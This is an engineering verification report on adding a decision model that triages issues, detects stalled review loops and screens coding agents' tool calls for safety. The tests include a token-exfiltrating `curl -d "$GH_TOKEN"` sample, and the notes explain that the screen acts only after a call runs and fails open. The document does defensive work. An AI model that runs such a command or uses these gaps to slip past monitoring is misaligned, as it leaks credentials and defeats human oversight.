# Issue #109: Decision Model (Jev) — verification

Checks were run in the Sandcastle sandbox (Node 26.10.0, pnpm 12.10.0, no
Docker) on this branch, after the issue's commits (`cee4c45` to the commit
adding this file).

## What was built

- **Jev through the AI Gateway** (ADR 0001; `packages/gateway`). Jev is
  TypeSafe's decision model. It writes no text. It answers typed questions
  about a `state`: a `noul` (the probability that a statement is true) or
  a `choice` (one of a set of options). Its API is `/v1/systemone`, and
  OpenRouter serves it there too, as `typesafe/jev-1.13`.
  - The Gateway answers `POST /v1/systemone` (a new endpoint, `systemone`).
    Like every model call, it needs a Gateway Key, is attributed to the
    Agent that asks and its issue and pull request (FR-42), and is refused
    at that Agent's Token Cap (FR-33).
  - It is passed through unchanged. Only an AI Account kind that names the
    endpoint serves it: OpenRouter's API key (`kindServes`). Kinds that
    name no endpoints serve every endpoint except this one. Anything else
    gets a `503`.
  - Its `input_tokens` and `output_tokens` are recorded.
  - Jev is priced in `pricing.json` at $0.042 per million input tokens,
    with output free, because OpenRouter's Models list leaves Jev out.
  - Gateway requests label it "Decisions (Jev)".
  - Fixture `fixtures/openrouter/systemone.json` was added.
- **The settings** (`@ai-office/shared` `decision-model.ts`; FR-17, FR-65,
  FR-89).
  - `enabled` is off by default.
  - `model` is Jev as OpenRouter names it: `typesafe/jev-1.13` by default,
    or `~typesafe/jev-latest`. Nothing else is taken, and
    `typesafe/jev-router`, a chat router, is refused.
  - `summaries` is off by default.
  - They are stored in `office_settings` (migration `0059_decision_model`).
    `OfficeSettings.decisionModelSettings()` and
    `setDecisionModelSettings()` read and write them. A change is a
    `config.changed` event naming each changed key under `decisionModel.*`.
  - `GET` and `PUT /api/office/decision-model` expose them.
  - The **Decision Model** card in AI Settings, beside the AI Providers,
    edits them.
- **Never an Agent's AI Provider.**
  - Jev is not in `aiProviders`, so `aiProvider: "Jev"` is refused as
    before.
  - `agentModelSchema` now refuses a Jev Model as an Agent's
    `modelOverride` (`PATCH` an Agent) and as an AI Provider's
    `defaultModel` (`PUT /api/ai-providers/:aiProvider`): "Jev is the
    Decision Model only: it is never an Agent's Model."
- **The judgements** (`createDecisionModel`,
  `packages/orchestrator/src/decision-model/`). Each judgement is a few
  typed questions. They are asked through `gatewayDecisionModelClient`
  with the **Floor's Manager's Gateway Key**, so each call is the
  Manager's in Gateway requests and counts against the Manager's Token
  Caps. Everything Jev reads is redacted first. Each judgement is
  `undefined` in two cases, and its caller then judges exactly as it did
  before this issue:
  - while the Decision Model is off;
  - when Jev cannot be asked: no Manager, the Gateway refuses (no
    OpenRouter account, a Token Cap), or the answer is malformed (a wrong
    type, or a choice outside the options). The server logs why.

  The three judgements:
  - **Is this issue clear enough?** (`Triage`, FR-23.) Jev is asked
    `clear` (a noul, clear at 50% or more), `priority` (`high`, `normal`
    or `low`) and `gap` (what the issue most lacks: acceptance criteria,
    what to build, where the work stops, or nothing).
    - The comment reads "… triaged this issue with the Decision Model" and
      gives the reason with Jev's probability.
    - An unclear issue's question comes from `gap`.
    - `issue.triaged` and `issue_triage` record `judgedBy:
      "decision_model"`, and the Activity Feed says "(by the Decision
      Model)".
    - The Manager's Model is asked only when Jev cannot be.
    - A paused Manager, or an issue with no description, is still judged
      by the rules, as before.
  - **Is this Review Loop stalled or repeating?** (`createReviewFlow`,
    FR-28.) Jev is given both rounds' blocking comments and the lines the
    fix changed, and chooses `converging`, `repeating` or `stalled`.
    - `repeating` or `stalled` escalates as the rules' stall does.
      `describeStall` says "the Decision Model judged that its blocking
      comments repeat round N's" or "… that the fix since round N made no
      real progress on its blocking comments".
    - `converging` sends the round back to the coder.
    - `stallOf`'s rules judge only when Jev cannot.
  - **Is this tool call safe?** (`toolCallCheck`, given to
    `createSandboxRunner` as its new `toolCallCheck` option.)
    - Each `toolCall` the agent tool streams is screened, with the issue,
      the Agent's Role, the tool and its arguments (redacted, cut to 4000
      characters).
    - A call judged at least 80% likely to be unsafe
      (`unsafeToolCallAt`) aborts the run. The run fails even if the Agent
      had already finished: pending screens are awaited before the run
      returns. Its clone is deleted and nothing is pushed. The message is
      "The sandbox for issue #N was stopped: the Decision Model judged a
      Bash call unsafe (97% likely)".
    - The coder (and QA, docs and designer, which share the runner) then
      raise "Agent blocked: …" as for any failed run.
    - A screen that throws lets the call be.
- **Summaries** (FR-89, the issue's scope addition).
  - `DecisionModel.summaryWriter(agent)` says who writes an Agent's Fresh
    Start and compaction summaries. It names the Decision Model, with its
    Model, only while the Decision Model is on and `summaries` is set.
    Otherwise it names the Agent's own Model.
  - Nothing calls it yet. See the notes below.
- **The server** (`apps/server/src/server.ts`).
  - It builds the Decision Model on its own Gateway's URL, with Agents'
    Gateway Keys and the central redactor.
  - It caches the settings and re-reads them on `config.changed`.
  - It gives the Decision Model to triage, the review flow and the
    sandbox runner.
- **The guide.**
  - [The AI Gateway](../guide/ai-gateway.md#jevs-decisions) has "Jev's
    decisions" and "The Decision Model", and its OpenRouter table names
    Jev.
  - [The issue pipeline](../guide/issue-pipeline.md#triage) covers Jev in
    triage, in the Review Loop's stall check and in sandboxes' tool call
    screen.
  - The README's and the guide index's descriptions name the Decision
    Model.

## Acceptance criteria

### Verified in the sandbox

- [x] **`pnpm lint`, `pnpm typecheck` and `pnpm test` pass.** All three
      exit 0 (output below). Without Docker, the Postgres tests skip with
      the reason: 3301 passed and 415 skipped, against 3258 and 409 before
      this issue.
- [x] **Tests with a fake Decision Model for each judgement.**
      `createFakeDecisionModel`
      (`packages/orchestrator/src/decision-model/fake-decision-model.ts`)
      stands in for Jev behind the Gateway. It scripts each Agent's answers
      in order, checks them against the questions as the real client does
      (`decisionAnswers`) and records every request.
  - **Is this issue clear enough?**
    - `manager/triage.test.ts`, through intake and the work queue as the
      server runs them:
      - **Clear:** Jev triages instead of the Manager's Model (no model
        request). It is asked with the Manager's Gateway Key, `model:
        typesafe/jev-1.13` and the issue. The work is queued at Jev's
        priority. The comment and the `issue.triaged` event say
        `decision_model`, and no Notice is raised.
      - **Unclear:** the issue waits, out of the pipeline, with an action
        Notice. Its comment gives Jev's reason ("8% likely to be clear")
        and the question for what it lacks.
      - **Jev cannot answer** (a 503): the Manager's Model triages
        instead.
    - `decision-model.test.ts`: the questions sent, a pasted Anthropic key
      never reaching Jev, and the clear/unclear threshold.
  - **Is this Review Loop stalled or repeating?**
    - `review/loop.test.ts`, end to end through intake, the coder (real
      Sandcastle `run()` in the fake sandbox), both reviewers and QA:
      - **Repeating:** Jev judges round 2 repeating, though its comment is
        new to the rules and the fix changed plenty. The issue goes to
        `needs-human` with "Review Loop stalled: PR #2 (#1) escalated at
        round 2 of 3: the Decision Model judged that its blocking comments
        repeat round 1's." Jev was asked once, with the Manager's key, the
        pull request and both rounds' blocking comments.
      - **Converging:** Jev judges round 2 converging, though it repeats
        round 1 word for word (the rules would stall it). It goes back to
        the coder, round 3 approves, and the issue reaches
        `ready-to-merge`.
      - **Jev refuses** (a 403): the rules judge, and the Notice is the
        rules' "its blocking comment repeats round 1's".
    - `review/stall.test.ts`: `judgedStall`, `describedBlocking` (nits
      left out) and `describeStall`'s new sentences.
  - **Is this tool call safe?**
    - `sandbox/runner.test.ts`, with real Sandcastle and the fake sandbox:
      - **Unsafe:** a `curl -d "$GH_TOKEN" …` judged unsafe stops the run
        while the Agent is still going. It fails with the reason, the
        sandbox is closed, the events are `started`, `text`, `tool_call`,
        `stopped (failed)`, and the clone is deleted.
      - **Judged late:** a run that finished before its unsafe call was
        judged still fails.
      - **Safe, or the screen throws:** the run finishes as usual.
    - `review/loop.test.ts`: the coder's `curl` judged unsafe (97%). No
      pull request is opened, and the only action Notice is "Agent
      blocked: … on #1: The sandbox for issue #1 was stopped: the Decision
      Model judged a Bash call unsafe (97% likely)".
    - `decision-model.test.ts`: unsafe at 80% and above (0.79 is safe,
      0.8 is not), redaction, and the cut to 4000 characters.
  - **Summaries:** `decision-model.test.ts`. The Agent's own Model while
    the Decision Model is off (even with `summaries` set) or `summaries`
    is off, and the Decision Model's Model once both are on.
  - **When Jev cannot be asked** (`decision-model.test.ts`): a Gateway
    503, a choice where a noul was asked, and a Floor without a Manager
    each give `undefined`, with the reason told.
  - **The client** (`decision-model/client.test.ts`), against a stand-in
    Gateway answering as OpenRouter's Jev does:
    - it posts to `/v1/systemone` with the Agent's Gateway Key as a bearer
      token and the `x-ai-office-issue` and `x-ai-office-pull-request`
      headers;
    - it refuses answers of the wrong type, a choice outside the options,
      missing answers and probabilities above 1;
    - it throws the Gateway's refusal with its status;
    - it asks nothing for an Agent without a key.
  - **The Gateway** (`gateway/src/decisions.test.ts`, and the OpenRouter
    contract's new `systemone.json`):
    - a decision skips a higher-priority Claude account and goes to
      OpenRouter's `/api/v1/systemone` unchanged, with OpenRouter's key
      and never the Gateway Key or AI Office's headers;
    - it is recorded as `systemone`, attributed to the Manager, issue 14,
      with 412/38 tokens and $0.0000173;
    - with no OpenRouter account it is a `503`; at a Token Cap it is a
      `403 token_cap` and goes nowhere; without a Gateway Key it is a
      `401`.
  - **Settings, API and card:**
    - `office/settings.test.ts`: the defaults, and `config.changed`
      naming only what changed;
    - `apps/server/src/office/routes.test.ts`: the defaults, setting Jev
      on, nothing but Jev taken (`claude-opus-5-5` and
      `typesafe/jev-router` refused), and the Owner only;
    - `decision-model-card.test.tsx`: off by default, turning it on, and
      refusing a non-Jev Model before anything is sent;
    - `shared/src/decision-model.test.ts`: the schema, and only OpenRouter
      answering `systemone`;
    - the Agent and AI Provider route tests, which refuse
      `typesafe/jev-1.13` as an Agent's Model or a default Model.
- [x] **Disabled path unchanged.**
  - Every existing test of triage, the Review Loop, the sandbox runner and
    the scenarios passes unchanged.
  - Triage and the Review Loop scenarios now run with the Decision Model
    wired in but off, its default.
  - Tests assert Jev is never asked while it is off:
    - triage, "with the Decision Model off, Jev is never asked: the
      Manager's Model triages as it always has";
    - the existing stall test, "escalates at round 2 … when its blocking
      comments repeat round 1's", with `jev.requests` empty and the same
      Notice as before;
    - "with the Decision Model off, screens no tool call";
    - `decision-model.test.ts`, "asks nothing, and judges nothing".
  - With no `toolCallCheck`, the runner behaves as before (its 24
    existing tests).

  **Mutation checks** (each reverted). Each change below made the tests
  named fail:

  | Change | Tests that failed |
  | --- | --- |
  | The Decision Model ignores `enabled` (asked while off) | 4: "asks nothing, and judges nothing"; triage's "with the Decision Model off…"; the Review Loop's stall-by-rules and "screens no tool call" |
  | Triage never asks Jev | 3: triage's clear, unclear and fallback cases (the fallback because Jev went unasked) |
  | The review flow ignores Jev's stall judgement | 2: the repeating and converging Review Loop cases |
  | The runner lets an unsafe call through | 3: the runner's two unsafe cases and the coder-blocked Review Loop case |
  | The unsafe threshold at 50% | 1: "judges a tool call unsafe only when it is at least 80% likely to be" |
  | Every AI Account kind serves `systemone` | 1: "is answered only by AI Accounts that name its endpoint: OpenRouter's". The Gateway's own test still passed, because the Model's name (`typesafe/…`) already sends it to OpenRouter. |

## Not verifiable in this sandbox

- **Postgres** (Docker). Migration `0059_decision_model` (three
  `office_settings` columns, and `decision_model` in
  `issue_triage_judged_by`) was not applied to Postgres 18. The Postgres
  runs of the new settings, triage and API cases are skipped with the
  reason. The migration was written by `drizzle-kit generate` from
  `schema.ts`.
- **A real Jev.** There is no OpenRouter account or network here.
  - The OpenRouter fixture and the client's stand-in answers were written
    by hand from OpenRouter's Jev tutorial
    (`openrouter.ai/docs/guides/community/jev-tutorial`) and TypeSafe's
    quickstart (`docs.typesafe.ai/introduction/quickstart`): the request's
    `model`, `state` and `questions`, and the answer's `answers` (`noul`;
    `choice` with `confidence` and `probabilities`) and `usage`
    (`input_tokens`, `output_tokens`).
  - Re-record against a real OpenRouter key on the host with
    `GATEWAY_FIXTURES_DIR`.
  - Whether Jev's judgements are good ones (that it calls a vague issue
    unclear, or a credential-exfiltrating `curl` unsafe) needs the real
    model.
- **The server's wiring.**
  - `server.ts` passes the Decision Model to triage, the review flow and
    the runner. It is checked by `tsc` and by the orchestrator scenarios,
    which wire the same `createDecisionModel` and `toolCallCheck` the same
    way.
  - There is no server-level end-to-end test: `main.test.ts`'s are
    Postgres tests, and this needs a GitHub App too.
- **Real sandboxes and agent tools:** the screen stopping a real Claude
  Code, Codex or opencode run in Docker.

## Notes, and disagreements with the canon

- **Jev writes no text, but FR-89 asks it to write summaries.** TypeSafe's
  documentation and OpenRouter's both say Jev answers only typed questions
  ("never a completion, never a JSON body, never an explanation"). FR-89
  and the issue's scope addition have it write Fresh Start and compaction
  summaries.
  - This issue adds the setting (off by default, in the card and the API)
    and `summaryWriter`, which says who writes them.
  - Fresh Starts (#121) and Manager chat compaction (#122) do not exist
    yet, so nothing consumes it, and Jev itself could not write a summary
    if asked.
  - **This should be raised on the issue for the Owner:** FR-89 either
    needs a text-writing Decision Model, or should drop summaries. I have
    no GitHub access in this run, so it is recorded here.
- **The glossary says the Decision Model is "used only by Managers and
  safety checks".** FR-89 (summaries) and FR-90 (the Communications
  Agent's Digests) give it other uses. Only FR-17's three judgements are
  built here; Digests are "anything else" and out of scope.
- **Only through OpenRouter.**
  - Jev's own API (`api.typesafe.ai/v1/systemone`, with a TypeSafe key)
    would need a new AI Account kind. Every kind belongs to an AI
    Provider, so it would also need a "Jev" or "TypeSafe" AI Provider,
    which FR-17 says Agents must never be able to choose. That would need
    a separate class of AI Provider, so it is left for a later issue.
  - Vercel's AI Gateway, which also serves Jev, is not an AI Account kind.
- **The tool call screen comes after the call.** AI Office sees an Agent's
  tool calls only as its agent tool streams them, after they have run in
  the sandbox.
  - The screen therefore stops what would come next and throws the run's
    work away. It cannot prevent the call itself.
  - Screening before a call runs would need a hook inside each agent tool
    (such as Claude Code's `PreToolUse`) calling back to AI Office, which
    is a bigger change.
  - The sandbox holds no write credentials (FR-19), which bounds what a
    call that has already run can do.
- **No tool-call rules while the Decision Model is off.** FR-17 says that
  when it is off, the judgements fall to "the Manager's own Model or
  deterministic rules". Nothing screened tool calls before this issue,
  and the brief asks for the disabled path unchanged. §11 also says "the
  Decision Model screens tool calls when enabled". So with it off, or
  with Jev unreachable, no call is screened: the screen fails open.
- **Attribution and caps.**
  - Every Jev call is the Floor's Manager's, tool-call screens for all of
    the Floor's Agents included. A Manager at its Token Cap therefore
    turns the Decision Model off for its Floor until the cap resets.
  - Jev's price is low ($0.042 per million input tokens), but the
    Manager's token counts include every screen.
  - A paused Manager does not triage with Jev (the rules do, as before).
    Its Gateway Key is still used for stall checks and tool call screens,
    which are AI Office's safety checks.
- **Thresholds are constants, not settings:** clear at 50% and unsafe at
  80% (`unsafeToolCallAt`). FR-17 names no settings beyond turning it on.
- **A race found while verifying.** The Decision Model can stop a run
  while the Agent's command is still writing to the clone. The clone's
  deletion then failed with `ENOTEMPTY`, so the run failed with that error
  instead of the reason (1 of 3301 tests, once). The runner now deletes
  the clone, Skills and memory directories with retries
  (`maxRetries: 5`). With the old, racier test ordering restored, the
  unsafe-call tests passed 8 runs out of 8.
- **Prices.** Only `typesafe/jev-1.13` is in the pricing table.
  `~typesafe/jev-latest` follows TypeSafe's newest release, so its calls
  have no estimated cost until the Owner sets one in Model prices.
- **Not judged by Jev:** conflicts between Roles (FR-30) and the
  watchdog's stalls (FR-23). FR-17 names only the Review Loop's
  stalling and repeating.
- **ADR 0003** renames `needs-code` to `needs-work`. The code still uses
  `needs-code`, as before this issue.

## Output

`pnpm lint`:

```text
$ eslint . && prettier --check .
Checking formatting...
All matched files use Prettier code style!
```

`pnpm typecheck` (tail):

```text
packages/gateway typecheck: Done
packages/orchestrator typecheck: Done
apps/server typecheck$ tsc
apps/web typecheck: Done
apps/server typecheck: Done
e2e typecheck$ tsc && tsc -p server
e2e typecheck: Done
```

`pnpm test` (tail):

```text
 Test Files  282 passed (282)
      Tests  3301 passed | 415 skipped (3716)
```

The new and changed tests (`vitest run --reporter=verbose`, excerpt):

```text
 ✓ |@ai-office/shared| src/decision-model.test.ts > the Decision Model's settings > are off, Jev 1.13, and not writing summaries until the Owner chooses
 ✓ |@ai-office/shared| src/decision-model.test.ts > the Decision Model's settings > take Jev as OpenRouter names it: a release, or the newest
 ✓ |@ai-office/shared| src/decision-model.test.ts > the Decision Model's settings > refuse any other Model, and anything missing
 ✓ |@ai-office/shared| src/decision-model.test.ts > Jev > is no AI Provider an Agent can choose
 ✓ |@ai-office/shared| src/decision-model.test.ts > Jev > is never an Agent's Model, nor an AI Provider's default
 ✓ |@ai-office/shared| src/decision-model.test.ts > Jev > is answered only by AI Accounts that name its endpoint: OpenRouter's
 ✓ |@ai-office/orchestrator| src/review/stall.test.ts > the Decision Model's judgement of a round (FR-17) > is a stall when Jev judges it repeating or stalled, and none when converging
 ✓ |@ai-office/orchestrator| src/review/stall.test.ts > the Decision Model's judgement of a round (FR-17) > reads each blocking comment, and no nit, with its file and line
 ✓ |@ai-office/orchestrator| src/decision-model/client.test.ts > gatewayDecisionModelClient > asks the Gateway's /v1/systemone with the Agent's Gateway Key, attributed to its issue and pull request
 ✓ |@ai-office/orchestrator| src/decision-model/client.test.ts > gatewayDecisionModelClient > refuses an answer that is not of the question's type, or not one of its options
 ✓ |@ai-office/orchestrator| src/decision-model/client.test.ts > gatewayDecisionModelClient > throws the Gateway's refusal with its status
 ✓ |@ai-office/orchestrator| src/decision-model/client.test.ts > gatewayDecisionModelClient > asks nothing for an Agent without a Gateway Key
 ✓ |@ai-office/orchestrator| src/office/settings.test.ts > office settings, kept in memory > asks no Decision Model until the Owner turns it on
 ↓ |@ai-office/orchestrator| src/office/settings.test.ts > office settings, kept in Postgres 18 > asks no Decision Model until the Owner turns it on [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is off > asks nothing, and judges nothing
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is off > leaves every summary to the Agent's own Model, even set to write them
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > judges whether an issue is clear, how soon to work it and what it lacks, with the Manager's Gateway Key
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > judges whether a Review Loop round is converging, repeating or stalled
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > judges a tool call unsafe only when it is at least 80% likely to be
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > shows Jev only the start of a long tool call
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > names why it stopped a tool call, for the sandbox runner
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > has summaries written by Jev only when set to
 ✓ |@ai-office/orchestrator| src/decision-model/decision-model.test.ts > the Decision Model, while it is on > judges nothing when Jev cannot be asked, and says why
 ✓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in memory > with the Decision Model off, Jev is never asked: the Manager's Model triages as it always has
 ✓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in memory > with the Decision Model on, Jev triages a clear issue in the Manager's Model's place, with the Manager's Gateway Key
 ✓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in memory > with the Decision Model on, an issue Jev judges unclear waits, asking the Owner for what it lacks
 ✓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in memory > with the Decision Model on but unable to answer, the Manager's Model triages instead
 ↓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in Postgres 18 > with the Decision Model off, Jev is never asked: the Manager's Model triages as it always has [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ↓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in Postgres 18 > with the Decision Model on, Jev triages a clear issue in the Manager's Model's place, with the Manager's Gateway Key [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ↓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in Postgres 18 > with the Decision Model on, an issue Jev judges unclear waits, asking the Owner for what it lacks [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ↓ |@ai-office/orchestrator| src/manager/triage.test.ts > the Manager's triage, in Postgres 18 > with the Decision Model on but unable to answer, the Manager's Model triages instead [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ✓ |@ai-office/gateway| src/decisions.test.ts > the Decision Model's questions through the AI Gateway > go to OpenRouter's API unchanged, attributed to the Agent and its issue, at Jev's price
 ✓ |@ai-office/gateway| src/decisions.test.ts > the Decision Model's questions through the AI Gateway > are a 503 when no AI Account answers them
 ✓ |@ai-office/gateway| src/decisions.test.ts > the Decision Model's questions through the AI Gateway > are refused at the asking Agent's Token Cap, and go nowhere
 ✓ |@ai-office/gateway| src/decisions.test.ts > the Decision Model's questions through the AI Gateway > need a Gateway Key
 ✓ |@ai-office/gateway| src/providers/openrouter.test.ts > OpenRouter > the OpenRouter fixtures > systemone.json passes through unchanged to OpenRouter's API, with its usage and cost recorded
 ✓ |@ai-office/web| src/decision-model-card.test.tsx > the Decision Model in AI Settings > is off by default, as Jev 1.13, writing no summaries
 ✓ |@ai-office/web| src/decision-model-card.test.tsx > the Decision Model in AI Settings > turns Jev on, with its newest Model, writing summaries
 ✓ |@ai-office/web| src/decision-model-card.test.tsx > the Decision Model in AI Settings > takes nothing but Jev, and saves nothing else
 ✓ |@ai-office/server| src/office/routes.test.ts > the office's settings, in memory > asks no Decision Model by default, and turns Jev on at runtime, never as anything but Jev
 ↓ |@ai-office/server| src/office/routes.test.ts > the office's settings, in Postgres 18 > asks no Decision Model by default, and turns Jev on at runtime, never as anything but Jev [Docker is not available (Could not find a working container runtime strategy), so the Postgres integration tests are skipped. They run in CI and on the host.]
 ✓ |@ai-office/web| src/activity-feed.test.tsx > event text > says how the Manager triaged an issue, and who judged
 ✓ |@ai-office/orchestrator| src/sandbox/runner.test.ts > the sandbox runner > stops a run at a tool call judged unsafe, keeping none of its work (FR-17)
 ✓ |@ai-office/orchestrator| src/sandbox/runner.test.ts > the sandbox runner > fails a run that finished before its unsafe tool call was judged
 ✓ |@ai-office/orchestrator| src/sandbox/runner.test.ts > the sandbox runner > lets every tool call be that is judged safe, or not judged at all
 ✓ |@ai-office/orchestrator| src/review/loop.test.ts > the Review Loop > with the Decision Model on, escalates at round 2 when Jev judges it repeating round 1
 ✓ |@ai-office/orchestrator| src/review/loop.test.ts > the Review Loop > with the Decision Model on, sends round 2 back to the coder when Jev judges it converging, though the rules would not
 ✓ |@ai-office/orchestrator| src/review/loop.test.ts > the Review Loop > with the Decision Model on but unable to answer, the rules judge the round as before
 ✓ |@ai-office/orchestrator| src/review/loop.test.ts > the Review Loop > with the Decision Model on, blocks a coder whose tool call Jev judges unsafe, opening no pull request
 ✓ |@ai-office/orchestrator| src/review/loop.test.ts > the Review Loop > with the Decision Model off, screens no tool call
```
